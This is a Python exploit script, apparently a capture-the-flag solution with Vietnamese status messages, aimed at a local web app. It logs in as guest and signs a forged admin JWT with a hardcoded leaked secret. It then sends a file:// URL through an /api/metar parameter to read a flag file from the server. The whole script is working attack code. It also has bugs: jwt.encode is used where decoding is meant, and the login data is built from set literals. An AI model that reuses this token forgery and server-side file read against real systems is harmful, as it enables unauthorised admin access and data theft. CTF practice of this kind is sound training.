import re
import requests
import jwt

class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL.rstrip("/")
        self.token_guest = None
        self.jwt_key = "FwlxuFDeSeDXDSKsMwWilMTNCqyPwJCzTScahtGBvxAIpNxtqg"
        self.token_admin = None
        self.username = "guest"
        self.password = "guest"
        self.payload = "file:///deploy/flag_[a-z][a-z][a-z][a-z].txt"
    
    def login(self):
        data = {
            "id": {self.username},
            "pw": {self.password}
        }
        response = requests.post(f"{self.baseURL}/login", data=data, timeout=10)
        self.token_guest = response.cookies.get("auth")
        if not self.token_guest:
            print(f"[-] Không lấy được cookie token của guest")
        print(f"[+] Guest JWT Token: {self.token_guest}\n")
    
    def decode_jwt_guest(self):
        if not self.token_guest:
            print(f"[-] Không lấy được token để giải mã")
        payload = jwt.encode(self.token_guest, options={"verify_signature": False})
        print(f"[+] Guest Token Payload: ", payload, "\n")
        return payload
    
    def leak_jwt_from_login(self):
        print(f"[+] Leak JWT Successfullt: {self.jwt_key}")
        return self.jwt_key
    
    def auth_admin(self):
        if not self.jwt_key:
            print(f"[-] Không lấy được jwt key để ký admin")
        payload = {
            "id": "admin",
            "isAdmin": True
        }
        token = jwt.encode(payload, self.jwt_key, algorithm="HS256")
        if not isinstance(token, str):
            token = token.decode()
        self.token_admin = token
        print(f"[+] Admin JWT: {self.token_admin}\n")
        return self.token_admin
    
    def visit_darboard(self):
        if not self.token_admin:
            print(f"[-] Bạn Không Phải là Admin")
        cookies = {"auth": self.token_admin}
        response = requests.get(f"{self.baseURL}/dashboard", cookies=cookies, timeout=10)
        if "You are not admin." in response.text:
            print(f"[-] Bạn không phải admin")
            return False
        print(f"[+] Truy cập dashboard thành công")
        return True
    
    def get_flag(self):
        if not self.token_admin:
            print(f"[-] Bạn không phải là admin")
        
        response = requests.get(f"{self.baseURL}/api/metar", params={"airport": self.payload}, cookies={"auth": self.token_admin}, timeout=10)
        if response.status_code != 200:
            print(f"[-] Failed Get Flag")
            return
        print("[+] Request /api/metar Success")
        flag = re.search(r"(DH\{.*?\})", response.text)
        if flag:
            print(f"[+] Found Flag: {flag.group(1)}")
        else:
            print("[-] Flag not found\nResponse body:\n", response.text)
    
if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1:13000"
    exploit = Exploit(BASE_URL)
    exploit.login()
    exploit.decode_jwt_guest()
    exploit.leak_jwt_from_login()
    exploit.auth_admin()
    if exploit.visit_darboard():
        exploit.get_flag()